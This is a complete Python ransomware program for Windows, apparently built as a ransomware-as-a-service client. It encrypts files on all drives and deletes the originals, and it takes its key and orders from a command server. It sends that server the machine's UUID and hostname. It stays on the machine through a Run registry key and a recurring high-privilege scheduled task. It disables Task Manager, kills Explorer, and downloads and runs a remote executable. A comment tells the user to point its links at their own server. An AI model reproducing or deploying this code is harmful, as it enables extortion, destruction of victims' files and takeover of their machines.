import csv
import os
import time
import subprocess
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA512
from Crypto.Random import get_random_bytes
import random
import win32security
import sys
import win32api
import requests
import pathlib
import winreg
import urllib.request
import pyuac
import psutil
import threading

debug = True


POST_API = "http://192.168.1.2/ransomware/API/post.php"
GET_API = "http://192.168.1.2/ransomware/API/get.php?UUID="
DisplayTool = "http://192.168.1.2/ransomware/tools/display.exe"

# CHANGE THOSE LINKS ACCORDING TO YOUR SERVER #


def key_derive(password):

    salt = bytes(str(0)*16, 'utf-8')
    keys = PBKDF2(password, salt, 64, count=10000, hmac_hash_module=SHA512)
    key1 = keys[:16]
    key2 = keys[16:32]
    iv = bytes(str(0)*16, 'utf-8')

    return key1, iv


all_files = []

temp_dir = "C:\\didntransomewhere\\"
if not os.path.exists(temp_dir):
    os.mkdir(temp_dir)


def error_log(thrower, error):
    if not os.path.exists(temp_dir+"\\" + "ransom-error-log.csv"):
        with open(temp_dir+"\\" + "ransom-error-log.csv", 'w') as newfile:
            writer = csv.writer(newfile)
            writer.writerow(["Error Type", "Error Message"])
            newfile.close()
    else:
        with open(temp_dir+"\\" + "ransom-error-log.csv", 'a') as errorlog:
            writer = csv.writer(errorlog)
            writer.writerow([str(thrower), str(error)])
            errorlog.close()


def pathalizer(path):
    split_path = path.split("\\")
    directory_array = split_path[0:-1]
    directory = "\\".join(directory_array)+"\\"
    file = split_path[-1]
    original_ext = file.split(".")[-1]
    file_name_only = file.replace("." + original_ext, "")
    return directory, file_name_only, original_ext


def encrypt(file_path):
    if debug is True: print("From ENC Func - Encrypting - ", file_path)
    global iv, derived_key
    if debug is True: print("From ENC Func - Keys: ", derived_key, iv)
    try:
        cipher = AES.new(derived_key, AES.MODE_CFB, iv=iv)  # CFB mode
        with open(file_path, 'rb') as original_file:
            contents = original_file.read()
            encrypted = cipher.encrypt(contents)
            # iv = cipher.iv
            original_file.close()

        directory, original_file_name, original_extension = pathalizer(file_path)
        new_infected_file_name = directory + original_file_name + ".crypt" + original_extension

        with open(new_infected_file_name, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)
            encrypted_file.close()

        return True

    except Exception as e:
        error_log("Encryption", e)
        pass


def decrypt(file_path):
    if debug is True: print("From DEC Func - Decrypting - ", file_path)
    global iv, derived_key
    if debug is True: print("From DEC Func - Keys: ", derived_key, iv)
    try:
        cipher2 = AES.new(derived_key, AES.MODE_CFB, iv=iv)
        with open(file_path, 'rb') as encrypted_file:
            contents = encrypted_file.read()
            decrypted = cipher2.decrypt(contents)
            encrypted_file.close()

        directory, encrypted_file_name, altered_extension = pathalizer(file_path)
        new_decrypted_file_name = directory + encrypted_file_name + "." + str(altered_extension[5:])

        with open(new_decrypted_file_name, 'wb') as decrypted_file:
            decrypted_file.write(decrypted)
            decrypted_file.close()

        return True

    except Exception as e:
        error_log("Decryption", e)
        pass


def check_if_already_infected(file):
    original_ext = file.split(".")[-1]

    if "crypt" in original_ext:
        if debug is True: print("File is Already Infected")
        return True
    else:
        if debug is True: print("File is Not infected")
        return False


#FOR TEST dir_blacklist = ["Windows", "Temp", "ProgramData", "Recovery", "AppData", "Program Files", "Program Files (x86)", "Boot", "Application Data", "Local Settings"]
dir_blacklist = ["Windows", "Windows.old", "Temp", "ProgramData", "Recovery", "AppData", "Application Data", "Local Settings"]


def walker(drives):
    global dir_blacklist
    current_file = str(pathlib.Path(__file__).absolute())

    for drive in drives:
        for (root, dirs, files) in os.walk(drive, topdown=True):
            dirs[:] = [d for d in dirs if d not in dir_blacklist]

            for file in files:
                file_path = os.path.join(root, file)
                if file_path != current_file:

                    all_files.append(file_path)

    return all_files



def check_access(file):
    if os.path.exists(file):
        try:
            permission_denied_users = ["trustedinstaller", "system"]
            sd = win32security.GetFileSecurity(file, win32security.OWNER_SECURITY_INFORMATION)
            owner_sid = sd.GetSecurityDescriptorOwner()
            name, domain, type = win32security.LookupAccountSid(None, owner_sid)
            name_in_lower = str(name).lower()
            if name_in_lower in permission_denied_users:
                if debug is True: print("File is present in Permission denied users")
                return False
            else:
                if debug is True: print("File is NOT present in Permission denied users")
                return True

        except Exception as e:
            error_log("Check Access", e)
            pass


def ransomize(drives):
    if debug is True: print("HI! from ransomize")
    file_list = walker(drives)
    for files in file_list:
        reg_save_state(state=1)
        if debug is True: print(files)
        # time.sleep(1)
        if check_access(files) is True and check_if_already_infected(files) is False:
            if debug is True: print("ACCESS: ", check_access(files))
            if debug is True: print("ALREADY INF: ", check_if_already_infected(files))
            enc = encrypt(files)
            print("ENC STAT:", enc)
            if enc is True:
                try:
                    os.remove(files)
                except Exception as e:
                    error_log("Ransomize", e)
                    pass
    reg_save_state(state=0)
    reg_save_status(raas_status=1)
    if debug is True: print("Reg query status: ", reg_query_status())
    if debug is True: print("Reg query state: ", reg_query_state())


def de_ransomize(drives):
    file_list = walker(drives)
    for files in file_list:
        reg_save_state(state=1)
        if debug is True: print(files)
        # time.sleep(1)
        if check_if_already_infected(files) is True:
            dec = decrypt(files)
            if dec is True:
                try:
                    os.remove(files)
                except Exception as e:
                    error_log("De_Ransomize", e)
                    pass
    reg_save_state(state=0)
    reg_save_status(raas_status=0)
    if debug is True: print("Reg query status: ", reg_query_status())
    if debug is True: print("Reg query state: ", reg_query_state())


def check_connection():
    try:
        urllib.request.urlopen("https://www.google.com")
        urllib.request.urlopen("http://192.168.1.2/ransomware/API/get.php")
        return True
    except:
        return False


def c2_verify():

    def upload_data(uuid):
        url = POST_API
        data = {'UUID': uuid, 'ed_state': -1, 'HOST': HOST}
        save = requests.post(url, data=data).json()
        # print("Server Response:", save)


    UUID = str(subprocess.check_output('wmic csproduct get UUID').strip()).replace("\\r", "").replace("\\t", "").replace("\\n", "").split(" ")[-1].strip("'")
    HOST = subprocess.check_output('hostname').strip().decode('utf-8')


    url = GET_API+UUID
    dat = requests.get(url).json()
    if debug is True: print(dat)

    if not dat.get('data'):
        if debug is True: print("System ID doesn't exist on server. Hence, uploading")
        time.sleep(2)
        upload_data(uuid=UUID)
    elif len(dat.get('data')[0]) == 3: # No of columns returned by API #

        ed_key = dat.get('data')[0].get('ran_key')
        ed_state = int(dat.get('data')[0].get('ransomize'))
        if debug is True: print("EDK: ", ed_key, "EDS: ", ed_state)

        return ed_key, int(ed_state)

    return (None, None)


def reg_save_status(raas_status):

    reg_path = winreg.HKEY_CURRENT_USER
    try:
        Ckey = winreg.CreateKey(reg_path, r"Software\\raas\\job")
    except winreg.error as e:
        return e

    try:
        Okey = winreg.OpenKeyEx(reg_path, r"Software\\raas\\job\\", 0, winreg.KEY_SET_VALUE)
        val = str(raas_status)
        winreg.SetValueEx(Okey, "Ransomized", 0, winreg.REG_SZ, val)
    except winreg.error as e:
        return e


def reg_save_state(state):
    reg_path = winreg.HKEY_CURRENT_USER
    try:
        Ckey = winreg.CreateKey(reg_path, r"Software\\raas\\job")
    except winreg.error as e:
        return e

    try:
        Okey = winreg.OpenKeyEx(reg_path, r"Software\\raas\\job\\", 0, winreg.KEY_SET_VALUE)
        val = str(state)
        winreg.SetValueEx(Okey, "Working", 0, winreg.REG_SZ, val)
    except winreg.error as e:
        return e


def reg_save_order(ransomize):
    reg_path = winreg.HKEY_CURRENT_USER
    try:
        Ckey = winreg.CreateKey(reg_path, r"Software\\raas\\job")
    except winreg.error as e:
        return e

    try:
        Okey = winreg.OpenKeyEx(reg_path, r"Software\\raas\\job\\", 0, winreg.KEY_SET_VALUE)
        val = str(ransomize)
        winreg.SetValueEx(Okey, "Order", 0, winreg.REG_SZ, val)
    except winreg.error as e:
        return e


def reg_save_display(display):
    reg_path = winreg.HKEY_CURRENT_USER
    try:
        Ckey = winreg.CreateKey(reg_path, r"Software\\raas\\job")
    except winreg.error as e:
        return e

    try:
        Okey = winreg.OpenKeyEx(reg_path, r"Software\\raas\\job\\", 0, winreg.KEY_SET_VALUE)
        val = str(display)
        winreg.SetValueEx(Okey, "Display", 0, winreg.REG_SZ, val)
    except winreg.error as e:
        return e


def reg_query_status():
    reg_path = winreg.HKEY_CURRENT_USER

    try:
        Okey = winreg.OpenKeyEx(reg_path, r"Software\\raas\\job\\", 0, winreg.KEY_QUERY_VALUE)
        read_status = winreg.QueryValueEx(Okey, 'Ransomized')[0]
        return int(read_status)

    except winreg.error as e:
        return 404


def reg_query_state():
    reg_path = winreg.HKEY_CURRENT_USER

    try:
        Okey = winreg.OpenKeyEx(reg_path, r"Software\\raas\\job\\", 0, winreg.KEY_QUERY_VALUE)
        read_status = winreg.QueryValueEx(Okey, 'Working')[0]
        return int(read_status)

    except winreg.error as e:
        return 404


def reg_query_order():
    reg_path = winreg.HKEY_CURRENT_USER

    try:
        Okey = winreg.OpenKeyEx(reg_path, r"Software\\raas\\job\\", 0, winreg.KEY_QUERY_VALUE)
        read_status = winreg.QueryValueEx(Okey, 'Order')[0]
        return int(read_status)

    except winreg.error as e:
        return 404


def reg_query_display():
    reg_path = winreg.HKEY_CURRENT_USER

    try:
        Okey = winreg.OpenKeyEx(reg_path, r"Software\\raas\\job\\", 0, winreg.KEY_QUERY_VALUE)
        read_status = winreg.QueryValueEx(Okey, 'Display')[0]
        return int(read_status)

    except winreg.error as e:
        return 404

# DOING 404 INSTEAD OF FALSE BECAUSE PYTHON TREATS 0 AS FALSE AND VICE VERSA #


def run_at_startup():
    if debug is True: print("Creating HKLM RUN Task")
    current_file = str('"' + str(psutil.Process(os.getpid()).exe()) + '"')
    if debug is True: print("CURRENT EXE: ", current_file)
    reg_path = winreg.HKEY_LOCAL_MACHINE
    try:
        key = winreg.OpenKeyEx(reg_path, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        val = current_file
        winreg.SetValueEx(key, 'RaaS', 0, winreg.REG_SZ, val)
        key.Close()
        return True
    except winreg.error as e:
        if debug is True: print("REG ERROR: ", e)
        return False


def heartbeat():
    if debug is True: print("Scheduling task")
    current_file = str(psutil.Process(os.getpid()).exe())
    shed = 'echo Y| schtasks /create /sc minute /mo 5 /tn "RAAS" /tr "' + current_file + '" /rl HIGHEST'
    if debug is True: print("Task: ", shed)
    run_shed = subprocess.Popen(shed, shell=True)
    if debug is True: print("Task Scheduler Message: ", run_shed)


def do_nothing():
    if debug is True: print("Doing nothing")
    if debug is True: print("Reg query status: ", reg_query_status())
    if debug is True: print("Reg query state: ", reg_query_state())
    # if debug is True: input("")
    time.sleep(2)
    sys.exit()
    pass


def restart():
    if debug is True: print("Restarting program after first run")
    main()
    sys.exit()


def disable_countermeasures():
    if debug is True: print("Disabling Countermeasures")
    taskman = os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    xplor = os.system('cmd /c "taskkill /f /im explorer.exe"')
    if debug is True: print("Countermeasure Stats: ", taskman, xplor)


def rollback():
    if pyuac.isUserAdmin():
        os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f")
        os.system("explorer.exe")


def display():
    if debug is True: print("Downloading and Executing Display.exe")
    content = requests.get(DisplayTool).content
    with open("display.exe", 'wb') as file:
        file.write(content)
    file.close()
    time.sleep(1)
    exec = os.system("display.exe")
    if debug is True: print("Display Execution: ", exec)


def main():
    global derived_key, iv

    if check_connection() is True:
        if debug is True: print("Internet Access Present! ")
        time.sleep(1)
        ed_key, ed_state = c2_verify()
        if debug is True: print("ED Key:", ed_key, "ED State ", ed_state)

        if ed_key and ed_state is not None:
            reg_save_order(ransomize=ed_state)
        else:
            reg_save_order(ransomize=-1)

        print("REG_ORDER: ", reg_query_order())
        print("RQSTATE: ", reg_query_state(), "RQSTATUS", reg_query_status())
        # time.sleep(4)

        if reg_query_status() != 404 and reg_query_state() != 404:
            if debug is True: print("REGQ_STATUS AND REGQ_STATE IS NOT FALSE")

            drives = win32api.GetLogicalDriveStrings()
            drives = drives.split('\000')[:-1]


            # drives = ["E:\\", ]

            print("DRIVES: ", str(drives))
            print("Entered Main stage")

            if ed_key and ed_state is not None and reg_query_order() == 1:
                if debug is True: print("EDK and EDS is NOT NONE and REGQ_ORDER is 1")
                derived_key, iv = key_derive(ed_key)
                if debug is True: print("DERIVED KEY and IV = ", str(derived_key) + "  " + str(iv))
                if reg_query_status() == 0 or reg_query_status() == -1 and reg_query_state() == 0:
                    if debug is True: print("Ransomizing")
                    if debug is True: print("Reg Query Display: ", reg_query_display())
                    if reg_query_display() != 1:
                        t1 = threading.Thread(target=display)
                        t1.start()
                        reg_save_display(display=1)
                    else:
                        pass
                    ransomize(drives)
                    disable_countermeasures()



            elif ed_key and ed_state is not None and reg_query_order() == 0:
                if debug is True: print("EDK and EDS is NOT NONE and REGQ_ORDER is 0")
                derived_key, iv = key_derive(ed_key)
                if debug is True: print("DERIVED KEY and IV = ", str(derived_key) + "  " + str(iv))
                if reg_query_status() == 1 and reg_query_state() == 0:
                    if debug is True: print("De Ransomizing")
                    de_ransomize(drives)
                    rollback()
                    if reg_query_display() == 1:
                        reg_save_display(display=0)
                    else:
                        pass

            if reg_query_status() == 1 and reg_query_order() == 1:
                if reg_query_display() != 1:
                    t1 = threading.Thread(target=display)
                    t1.start()
                    reg_save_display(display=1)
                    disable_countermeasures()
                else:
                    pass

            else:
                do_nothing()

        else:
            if debug is True: print("Entered first run state.")
            # time.sleep(1)
            if debug is True: print("Populating Registry with default state values")
            # time.sleep(3)
            reg_save_state(state=0)
            reg_save_display(display=-1)
            if ed_state == 1:
                reg_save_status(raas_status=0)
            elif ed_state == 0:
                reg_save_status(raas_status=1)
            elif ed_state == -1:
                reg_save_status(raas_status=-1)
            # time.sleep(2)
            restart()

    else:
        if debug is True: print("No Internet Connection Found. Quitting")
        sys.exit()


if __name__ == '__main__':
    if not pyuac.isUserAdmin():
        if debug is True: print("Re-launching as admin!")
        pyuac.runAsAdmin()
    else:
        run_at_startup()
        heartbeat()
        main()

    # main()


